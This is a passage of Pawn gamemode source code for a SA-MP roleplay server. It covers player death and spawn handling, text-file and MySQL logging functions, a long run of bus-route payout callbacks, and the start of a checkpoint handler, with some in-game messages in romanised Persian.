                            SCM(playerid,COLOR_Good,strali);
                            TimerAnnouncer[playerid] = 60;
                            Ghatel[playerid] = killerid;
                            GhatelWanted[playerid] = 1;
                            format(CrimeText[playerid], 100, "Murderer");
                            return 1;
                        }
                    }
                }
        }
    }
    if (gTeam[playerid] == TEAM_COP)
    {
        if(killerid != INVALID_PLAYER_ID && killerid != playerid && hiter != killerid)
        {
            if (gTeam[killerid] != TEAM_COP)
            {
                if(IsAMemberC(playerid) && IsAMemberC(killerid))
                {
                    return 1;
                }
                if(IsACop(killerid))
                {
                    return 1;
                }
                if(PlayerInfo[killerid][pJailTime] <= 0)
                {
                    if(Ghatel[playerid] != killerid)
                    {
                        new strali[256];
                        format(strali, 256, " %s murdered you. You have 60 seconds to announce the police. Use /call 110.", PINFO[killerid][pName]);
                        SCM(playerid,COLOR_Good,strali);
                        TimerAnnouncer[playerid] = 60;
                        Ghatel[playerid] = killerid;
                        GhatelWanted[playerid] = 1;
                        format(CrimeText[playerid], 100, "Murderer");
                    }
                }
            }
        }
    }
    if (killerid != INVALID_PLAYER_ID && gTeam[playerid] != TEAM_COP && GetPlayerState(killerid) != PLAYER_STATE_DRIVER)
    {
      if(killerid != INVALID_PLAYER_ID && killerid != playerid && hiter != killerid)
      {
          if (gTeam[killerid] != TEAM_COP)
          {
              if(IsAMemberC(playerid) && IsAMemberC(killerid))
              {
                   return 1;
              }
              if(IsACop(killerid))
              {
                  return 1;
              }
              if(PlayerInfo[killerid][pJailTime] <= 0)
              {
                   if(Ghatel[playerid] != killerid)
                   {
                        new strali[256];
                        format(strali, 256, "%s murdered you. You have 60 seconds to announce the police. Use /call 110.", PINFO[killerid][pName]);
                        SCM(playerid,COLOR_Good,strali);
                        TimerAnnouncer[playerid] = 60;
                        Ghatel[playerid] = killerid;
                        GhatelWanted[playerid] = 1;
                        format(CrimeText[playerid], 100, "Murderer");
                   }
              }
          }
      }
    }
    if(killerid != INVALID_PLAYER_ID && hiter != killerid)
    {
        if (gTeam[playerid] != TEAM_COP && GetPlayerWantedLevel(playerid) > 0 && gTeam[killerid] == TEAM_COP)
        {
            SetPlayerFree(playerid,killerid, "Got Killed");
        }
    }
    return 1;
}
public fs(playerid)
{
for(new i = 0; i < 11; i++)
	{
		TextDrawHideForPlayer(playerid,wtd[i]);
	}
}
public OnPlayerSpawn(playerid)
{

Bio[playerid] = true;
//TextDrawShowForPlayer(playerid, TDEditor_PTD[playerid][1]);
TextDrawShowForPlayer(playerid, ShadowsRandom);
	PlayerInfo[playerid][pOnline] = 1;
    SaveKonVal(playerid, "pOnline", 1);
	if(AFK[playerid] == 1)
	{
		TogglePlayerControllable(playerid, 0);
		SetPlayerColor(playerid,COLOR_AFK);
		LoopingAnim(playerid,"CRACK","crckidle2",4.0,0,0,0,1,0);
	}
	if(PlayerOnDeathing[playerid] == true) PlayerOnDeathing[playerid] = false;
	PlayDeathingCamera[playerid] = false;
	SetPlayerKhoon(true, playerid,100);
	SetPlayerZereh(playerid, 0);
	if(IsPlayerDeath[playerid] == true) IsPlayerDeath[playerid] = false;
	//SaveAccount(playerid);
	if(!gPlayerAnimLibsPreloaded[playerid])
	{
		PreloadAnimLib(playerid,"BAR");
		PreloadAnimLib(playerid,"BASEBALL");
            PreloadAnimLib(playerid,"BD_FIRE");
            PreloadAnimLib(playerid,"BEACH");
            PreloadAnimLib(playerid,"BF_injection");
            PreloadAnimLib(playerid,"benchpress");
            PreloadAnimLib(playerid,"BIKEH");
            PreloadAnimLib(playerid,"FOOD");
            PreloadAnimLib(playerid,"MISC");
            PreloadAnimLib(playerid,"BIKELEAP");
            PreloadAnimLib(playerid,"BIKES");
            PreloadAnimLib(playerid,"BIKEV");
            PreloadAnimLib(playerid,"BMX");
            PreloadAnimLib(playerid,"BIKE_DBZ");
            PreloadAnimLib(playerid,"MD_CHASE");
            PreloadAnimLib(playerid,"BOX" );
            PreloadAnimLib(playerid,"BOMBER" );
            PreloadAnimLib(playerid,"BSKTBALL" );
            PreloadAnimLib(playerid,"CAMERA" );
            PreloadAnimLib(playerid,"PARACHUTE" );
            PreloadAnimLib(playerid,"GANGS" );
            PreloadAnimLib(playerid,"LOWRIDER" );
            PreloadAnimLib(playerid,"GYMNASIUM" );
            PreloadAnimLib(playerid,"ON_LOOKERS" );
            PreloadAnimLib(playerid,"CAR_CHAT" );
            PreloadAnimLib(playerid,"CASINO" );
            PreloadAnimLib(playerid,"BUDDY" );
            PreloadAnimLib(playerid,"BUS" );
            PreloadAnimLib(playerid,"CAR" );
            PreloadAnimLib(playerid,"CARRY" );
            PreloadAnimLib(playerid,"INT_SHOP" );
            PreloadAnimLib(playerid,"JST_BUISNESS" );
            PreloadAnimLib(playerid,"KART" );
            PreloadAnimLib(playerid,"KISSING" );
            PreloadAnimLib(playerid,"KNIFE" );
            PreloadAnimLib(playerid,"LAPDAN1" );
            PreloadAnimLib(playerid,"LAPDAN2" );
            PreloadAnimLib(playerid,"LAPDAN3" );
            PreloadAnimLib(playerid,"MD_END" );
            PreloadAnimLib(playerid,"MTB" );
            PreloadAnimLib(playerid,"MUSCULAR" );
            PreloadAnimLib(playerid,"OTB" );
            PreloadAnimLib(playerid,"CHAINSAW" );
            PreloadAnimLib(playerid,"CHOPPA" );
            PreloadAnimLib(playerid,"PARK" );
            PreloadAnimLib(playerid,"NEVADA" );
            PreloadAnimLib(playerid,"CLOTHES" );
            PreloadAnimLib(playerid,"COACH" );
            PreloadAnimLib(playerid,"COLT45" );
            PreloadAnimLib(playerid,"COP_AMBIENT" );
            PreloadAnimLib(playerid,"PAULNMAC" );
            PreloadAnimLib(playerid,"COP_DVBYZ" );
            PreloadAnimLib(playerid,"CRACK" );
            PreloadAnimLib(playerid,"CRIB" );
            PreloadAnimLib(playerid,"DAM_JUMP" );
            PreloadAnimLib(playerid,"DANCING" );
            PreloadAnimLib(playerid,"DEALER" );
            PreloadAnimLib(playerid,"DILDO" );
            PreloadAnimLib(playerid,"DODGE" );
            PreloadAnimLib(playerid,"DOZER" );
            PreloadAnimLib(playerid,"DRIVEBYS" );
            PreloadAnimLib(playerid,"FAT" );
            PreloadAnimLib(playerid,"FIGHT_B" );
            PreloadAnimLib(playerid,"FIGHT_C" );
            PreloadAnimLib(playerid,"FIGHT_D" );
            PreloadAnimLib(playerid,"FIGHT_E" );
            PreloadAnimLib(playerid,"FINALE" );
            PreloadAnimLib(playerid,"FINALE2" );
            PreloadAnimLib(playerid,"Flowers" );
            PreloadAnimLib(playerid,"GHANDS" );
            PreloadAnimLib(playerid,"Freeweights" );
            PreloadAnimLib(playerid,"GHETTO_DB" );
            PreloadAnimLib(playerid,"GRAFFITI" );
            PreloadAnimLib(playerid,"GRENADE" );
            PreloadAnimLib(playerid,"GRAVEYARD" );
            PreloadAnimLib(playerid,"HAIRCUTS" );
            PreloadAnimLib(playerid,"HEIST9" );
            PreloadAnimLib(playerid,"INT_HOUSE" );
            PreloadAnimLib(playerid,"INT_OFFICE" );
            PreloadAnimLib(playerid,"PLAYER_DVBYS" );
            PreloadAnimLib(playerid,"PLAYIDLES" );
            PreloadAnimLib(playerid,"POLICE" );
            PreloadAnimLib(playerid,"POOL" );
            PreloadAnimLib(playerid,"POOR" );
            PreloadAnimLib(playerid,"PYTHON" );
            PreloadAnimLib(playerid,"QUAD" );
            PreloadAnimLib(playerid,"QUAD_DBZ" );
            PreloadAnimLib(playerid,"RAPPING" );
            PreloadAnimLib(playerid,"RIFLE" );
            PreloadAnimLib(playerid,"RIOT" );
            PreloadAnimLib(playerid,"ROB_BANK" );
            PreloadAnimLib(playerid,"ROCKET" );
            PreloadAnimLib(playerid,"RUSTLER" );
            PreloadAnimLib(playerid,"BIKED" );
            PreloadAnimLib(playerid,"RYDER" );
            PreloadAnimLib(playerid,"SCRATCHING" );
            PreloadAnimLib(playerid,"SHAMAL" );
            PreloadAnimLib(playerid,"SHOP" );
            PreloadAnimLib(playerid,"SHOTGUN" );
            PreloadAnimLib(playerid,"SKATE" );
            PreloadAnimLib(playerid,"VORTEX" );
            PreloadAnimLib(playerid,"TEC" );
            PreloadAnimLib(playerid,"SILENCED" );
            PreloadAnimLib(playerid,"TRAIN" );
            PreloadAnimLib(playerid,"TATTOOS" );
            PreloadAnimLib(playerid,"SMOKING" );
            PreloadAnimLib(playerid,"SPRAYCAN" );
            PreloadAnimLib(playerid,"STRIP" );
            PreloadAnimLib(playerid,"SUNBATHE" );
            PreloadAnimLib(playerid,"SWAT" );
            PreloadAnimLib(playerid,"SWEET" );
            PreloadAnimLib(playerid,"SWIM" );
            PreloadAnimLib(playerid,"SWORD" );
            PreloadAnimLib(playerid,"TANK" );
            PreloadAnimLib(playerid,"TRUCK" );
            PreloadAnimLib(playerid,"UZI" );
            PreloadAnimLib(playerid,"VAN" );
            PreloadAnimLib(playerid,"VENDING" );
            PreloadAnimLib(playerid,"WAYFARER" );
            PreloadAnimLib(playerid,"WEAPONS" );
            PreloadAnimLib(playerid,"WUZI" );
            PreloadAnimLib(playerid,"Attractors" );
            PreloadAnimLib(playerid,"PED" );
            PreloadAnimLib(playerid,"SNM" );
            PreloadAnimLib(playerid,"BLOWJOBZ" );
            PreloadAnimLib(playerid,"MEDIC" );
            PreloadAnimLib(playerid,"AIRPORT" );
            PreloadAnimLib(playerid,"FLAME" );
            PreloadAnimLib(playerid,"goggles" );
		PreloadAnimLib(playerid,"SNIPER" );
		gPlayerAnimLibsPreloaded[playerid] = 1;
	}
	if(PlayerRespawned[playerid] == 1) { AntiKhoonHack[playerid] = SetTimerEx("KhoonTimer",2000,1,"i",playerid); PlayerRespawned[playerid] = 0; }
	PlayerHandsCuffed[playerid] = 0;
	PlayerCuffed[playerid] = 0;
	ResetPlayerTofang(playerid);
	TogglePlayerControllable(playerid, 1);
	SetPlayerWantedLevel(playerid, PlayerInfo[playerid][pWanted]);
	if(IsInFaction(playerid)) { SetPlayerSkin(playerid, PlayerInfo[playerid][fSkin]); SetPlayerWeapons(playerid); }
	else SetPlayerSkin(playerid, PlayerInfo[playerid][cSkin]);
	SetPlayerSpawn(playerid);
	SetPlayerToTeamColor(playerid);
	PlayerFixRadio(playerid);
	HealthAllowedForPlayer[playerid] = 1;
	InModShop[playerid] = 0;
	if(gPlayerLogged[playerid] == 0) return 1;
if(OnFirstSpawn[playerid] == true){
for(new i = 0; i < 11; i++)
	{
		TextDrawShowForPlayer(playerid,wtd[i]);
	}
//	gPlayerLogged[playerid]++;
	SetTimerEx("fs", 9000, false, "i", playerid);
	OnFirstSpawn[playerid] = false;
	}
PlayerTextDrawSetPreviewModel(playerid, pmodel[playerid], GetPlayerSkin(playerid));
PlayerTextDrawHide(playerid, pmodel[playerid]);
PlayerTextDrawShow(playerid, pmodel[playerid]);
    return 1;
}

public KickLog(string[])
{
    new entry[256];
    format(entry, sizeof(entry), "%s\n",string);
    new File:hFile;
    hFile = fopen("Logs/kick.log", io_append);
    fwrite(hFile, entry);
    fclose(hFile);
}
public AdminLog(string[])
{
    new entry[256];
    format(entry, sizeof(entry), "%s\n",string);
    new File:hFile;
    hFile = fopen("Logs/adminlog.log", io_append);
    fwrite(hFile, entry);
    fclose(hFile);
}
public MoneyLog(string[])
{
    new entry[256];
    format(entry, sizeof(entry), "%s\n",string);
    new File:hFile;
    hFile = fopen("Logs/MoneyLog.log", io_append);
    fwrite(hFile, entry);
    fclose(hFile);
}


public AddLog(const player[], const taraf[], const harf[], const harf2[], no)
{
new string[256];
new dd,mm,yy;
new ore,mn,sec;
getdate(dd,mm,yy);
gettime(ore,mn,sec);
format(string,sizeof(string), "%s%d/%s%d/%s%d  %s%d:%s%d", (dd < 10) ? ("0") : (""),dd, (mm < 10) ? ("0") : (""),mm, (yy < 10) ? ("0") : (""),yy, (ore < 10) ? ("0") : (""),ore,(mn < 10) ? ("0") : (""),mn);

new query2[512];
format(query2, 512, "INSERT INTO `logs` (`Player`,`Taraf`,`Harf`,`Harf2`,`No`,`Date`)VALUES ('%s','%s','%s','%s','%d','%s')",player,taraf,harf,harf2,no,string);
mysql_query(handle, query2);
}



public WarnLog(string[])
{
    new entry[256];
    format(entry, sizeof(entry), "%s\n",string);
    new File:hFile;
    hFile = fopen("Logs/warnlog.log", io_append);
    fwrite(hFile, entry);
    fclose(hFile);
}

public FactionLog(string[])
{
    new entry[256];
    format(entry, sizeof(entry), "%s\n",string);
    new File:hFile;
    hFile = fopen("Logs/factionlog.log", io_append);
    fwrite(hFile, entry);
    fclose(hFile);
}
public busstop1(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,1938.380371,-2169.916259,13.382812, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1201;
format(string, sizeof(string), "You get $%d money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop2(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,2285.371826,-1662.898315,14.936391, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1202;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop3(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,2450.424804,-1448.213989,23.828125, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1203;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop4(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,2695.902832,-1661.408569,11.937602, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1204;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop5(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,2463.549804,330.016906,31.871097, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1205;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop6(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,2340.336181,113.618858,26.338420, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1206;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop7(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,1321.443481,238.963165,19.406250, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1207;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop8(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,204.882202,-1375.271118,49.474456, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1208;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop9(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,927.803588,-965.041687,38.253925, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1209;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop10(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,793.322753,-1093.177124,23.955106, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1210;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop11(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,1191.808837,-1356.988891,13.377698, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1211;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop12(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,1525.891235,-1630.682006,13.382812, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1212;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop13(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,1788.017333,-1735.934448,13.382812, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1213;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop14(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,2236.548095,-1753.222290,13.390602, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1214;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop15(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,2346.216064,-1476.802490,23.828125, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1215;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop16(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,1798.175048,-2070.627929,13.570152, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1216;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop17(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,1923.543457,2116.836914,10.728834, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1218;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop18(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,2118.590576,1941.035766,10.671875, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1219;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop19(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,1920.406616,1717.348022,10.671875, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1220;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop20(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,1727.924926,1531.290161,10.664346, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1221;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop21(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,1723.038818,1365.177490,10.499944, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1222;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop22(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,1545.306762,1136.974609,10.671875, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1223;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop23(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,1084.777221,1197.034790,10.671875, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1224;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop24(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,1074.901123,2057.075439,10.671875, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1225;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop25(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,168.761199,1156.248413,14.423420, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1226;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop26(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,1601.922119,1129.193847,10.671875, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1227;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop27(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,2134.760009,1369.082031,10.671875, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1228;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop28(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,2556.691406,1308.975341,10.671875, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1229;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public busstop29(playerid)
{
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
new rands = RandomShomare(500,1000);
new string[256];
GivePlayerPool(playerid, rands);
OnCheckpoint[playerid] = 1;
SetPlayerCheckpoint(playerid,1893.817626,2286.743164,10.820312, 3.0);
TogglePlayerControllable(playerid, 1);
CP[playerid] = 1230;
format(string, sizeof(string), "You get $%i money, You can go to the next bus stop",rands);
SCM(playerid,COLOR_WHITE,string);
return 1;
}
/*----------------------------------------------------------------------------*/
public OnPlayerEnterCheckpoint(playerid)
{
	if(CP[playerid] == 256512)
	{
        if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,-1,"Bayad Dakhele Mashin Sherkati Bashid.");
		 new vehicleid = GetPlayerVehicleID(playerid);
        if(Isjscar(vehicleid))
        {
        new string[256];
        AgeBarDasht[playerid] = 0;
        DisablePlayerCheckpoint(playerid);
        OnCheckpoint[playerid] = 0;
        CP[playerid] = 0;
        SetVehicleToRespawn(vehicleid);
        new Float:x,Float:y,Float:z; GetPlayerPos(playerid,x,y,z);
        new vehd = CreateVehicle(522,x,y,z);
        PutPlayerInVehicle(playerid,vehd,0);
        format(string,sizeof(string),"Shoma Bar Ra Be MAGHSAD Resandid Va Sherkat Be Shoma {abc611}%d{ffffff} Pool Va Yek Motor Movaghat Be Shoma Dad",Sherkat[playerid][AgeBarDasht[playerid]])
        GivePlayerPool(playerid,Sherkat[playerid][AgeBarDasht[playerid]]);
